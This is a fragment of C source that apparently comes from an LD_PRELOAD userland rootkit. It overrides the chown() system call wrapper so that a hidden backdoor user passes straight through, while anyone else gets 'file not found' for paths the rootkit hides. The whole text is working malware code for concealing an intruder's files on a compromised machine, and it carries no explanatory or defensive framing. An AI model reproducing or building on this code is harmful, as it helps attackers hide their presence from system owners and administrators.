int chown(const char *pathname, uid_t owner, gid_t group){
    hook(CCHOWN);
    if(is_bdusr()) return (long)call(CCHOWN, pathname, owner, group);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CCHOWN, pathname, owner, group);
}
